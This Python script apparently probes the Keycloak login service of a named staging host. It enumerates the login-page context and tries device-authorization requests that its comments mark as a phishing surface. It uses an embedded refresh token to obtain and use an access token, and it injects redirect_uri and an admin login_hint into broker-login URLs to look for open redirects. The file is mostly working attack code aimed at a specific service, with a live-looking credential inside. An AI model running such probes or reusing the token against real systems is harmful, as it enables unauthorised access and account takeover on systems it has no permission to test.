# -*- coding: utf-8 -*-
"""Keycloak 功能面[3]:
1. kcContext 强健解析(social 全列表/登录页字段)
2. device authorization flow(client_id=neon-console) —— 钓鱼面
3. PAR pushed authorization endpoint
4. userinfo(刷新 access token)
5. broker login redirect_uri/login_hint 注入
6. introspection/revoke public client 行为"""
import http.client, ssl, json, time, urllib.parse, re, base64

ctx = ssl.create_default_context()
HOST = 'console-stage.neon.build'
REALM = 'staging-realm'
CLIENT = 'neon-console'
REFRESH = "eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJjMjMwZDA1Yi1kMzliLTQwZTUtYTY5Ny0wOWU0YWRlOTYxZTEifQ.eyJleHAiOjE3ODkwMjczOTcsImlhdCI6MTc4ODQyMjU5NywianRpIjoiY2RiYWRlNjAtMDFjMy00YjQxLWEyOWItODI0YTk3NWUxYWZkIiwiaXNzIjoiaHR0cHM6Ly9jb25zb2xlLXN0YWdlLm5lb24uYnVpbGQvcmVhbG1zL3N0YWdpbmctcmVhbG0iLCJhdWQiOiJodHRwczovL2NvbnNvbGUtc3RhZ2UubmVvbi5idWlsZC9yZWFsbXMvc3RhZ2luZy1yZWFsbSIsInN1YiI6IjJkNTQzNmZiLTdlYTEtNGFkYS05MDQ1LWZjMGQzZGViM2EwZCIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJuZW9uLWNvbnNvbGUiLCJzaWQiOiJiNDVhNWIyMS1jNDdmLTQ2OGMtYTM5Mi1jZjFmZjIyMTM4NTUiLCJzY29wZSI6Im9wZW5pZCByb2xlcyBiYXNpYyBwcm9maWxlIGVtYWlsIHdlYi1vcmlnaW5zIGFjciJ9.HcKwiJBDss9g0yti0hbyvs-5ORBej37SRqo1Q6ngA53HFlC65JDgfndVyJzciGJ4kmQ4g9-ESV1MQd1yy7nYkA"

def req(path, method='GET', body=None, headers=None, host=HOST):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0', 'Accept': '*/*'}
        if body is not None:
            h['Content-Type'] = 'application/x-www-form-urlencoded'
        if headers:
            h.update(headers)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

def parse_kc(raw):
    """括号配对解析 kcContext(容忍注释)"""
    i = raw.find('const kcContext = ')
    if i < 0:
        return None
    i = raw.find('{', i)
    depth = 0
    in_str = False
    esc = False
    j = i
    while j < len(raw):
        c = raw[j]
        if in_str:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == '"':
                in_str = False
        else:
            if c == '"':
                in_str = True
            elif c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    break
        j += 1
    s = raw[i:j + 1]
    s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
    try:
        return json.loads(s)
    except Exception as e:
        print('  JSON parse err:', e)
        return None

print('=== [1] 登录页 kcContext 全量 ===', flush=True)
st, raw, hdrs = req('/realms/%s/protocol/openid-connect/auth?client_id=%s&redirect_uri=%s&response_type=code&scope=openid+profile+email&state=aaa' % (
    REALM, CLIENT, urllib.parse.quote('https://console-stage.neon.build/auth/keycloak/callback', safe='')))
d = parse_kc(raw)
if d:
    print('pageId:', d.get('pageId'))
    if d.get('social'):
        for p in d['social'].get('providers', []):
            print('  provider: %s alias=%s url=%s' % (p.get('displayName'), p.get('alias'), p.get('loginUrl')))
    for k, v in d.items():
        if not isinstance(v, (dict, list)):
            print('  %s = %s' % (k, str(v)[:130]))
    reg = d.get('registration')
    if isinstance(reg, dict):
        print('  registration:', json.dumps(reg))
else:
    print('  parse fail, raw:', raw[:200])

print('\n=== [2] device authorization ===', flush=True)
for cid in [CLIENT, 'neon-console-public', 'account', 'admin-cli']:
    b = urllib.parse.urlencode({'client_id': cid, 'scope': 'openid email profile'})
    st2, raw2, _ = req('/realms/%s/protocol/openid-connect/auth/device' % REALM, 'POST', b)
    print('[%s] -> %d | %s' % (cid, st2, raw2[:220].replace('\n', ' ')), flush=True)
    time.sleep(0.3)

print('\n=== [3] PAR endpoint ===', flush=True)
b = urllib.parse.urlencode({'client_id': CLIENT, 'response_type': 'code',
                            'redirect_uri': 'https://console-stage.neon.build/auth/keycloak/callback',
                            'scope': 'openid email profile', 'state': 'parst'})
st3, raw3, _ = req('/realms/%s/protocol/openid-connect/ext/par/request' % REALM, 'POST', b)
print('-> %d | %s' % (st3, raw3[:220].replace('\n', ' ')), flush=True)

print('\n=== [4] refresh + userinfo ===', flush=True)
b = urllib.parse.urlencode({'grant_type': 'refresh_token', 'client_id': CLIENT, 'refresh_token': REFRESH})
st4, raw4, _ = req('/realms/%s/protocol/openid-connect/token' % REALM, 'POST', b)
at = ''
if st4 == 200:
    at = json.loads(raw4).get('access_token', '')
    print('refresh OK, at len:', len(at))
else:
    print('refresh FAIL:', raw4[:150])
if at:
    for hdr_name, hv in [('Authorization', 'Bearer ' + at), ('X-Keycloak-Origin', '')]:
        hd = {'Authorization': hv} if hdr_name == 'Authorization' else {}
        st5, raw5, _ = req('/realms/%s/protocol/openid-connect/userinfo' % REALM, 'GET', headers=hd)
        print('[userinfo %s] -> %d | %s' % (hdr_name, st5, raw5[:300]))
        time.sleep(0.2)
    # introspection(public client 无 secret)
    b6 = urllib.parse.urlencode({'token': at, 'client_id': CLIENT})
    st6, raw6, _ = req('/realms/%s/protocol/openid-connect/token/introspect' % REALM, 'POST', b6)
    print('[introspect public] -> %d | %s' % (st6, raw6[:200]))
    # revoke
    b7 = urllib.parse.urlencode({'token': at, 'client_id': CLIENT})
    st7, raw7, _ = req('/realms/%s/protocol/openid-connect/revoke' % REALM, 'POST', b7)
    print('[revoke public] -> %d | %s' % (st7, raw7[:200]))

print('\n=== [5] broker login 参数注入 ===', flush=True)
for alias in ['github', 'google', 'hasura', 'microsoft']:
    # login 端点带 redirect_uri 参数(Keycloak 历史上开放重定向 CVE 面)
    ru = urllib.parse.quote('https://console-stage.neon.build/auth/keycloak/callback', safe='')
    for extra in ['', '&redirect_uri=' + ru, '&login_hint=admin@neon.tech', '&scope=email']:
        p = '/realms/%s/broker/%s/login?client_id=%s%s' % (REALM, alias, CLIENT, extra)
        st8, raw8, hdrs8 = req(p)
        loc = hdrs8.get('location', '')
        print('[%s %s] -> %d loc=%s' % (alias, extra[:40] or '(plain)', st8, loc[:120]), flush=True)
        time.sleep(0.25)
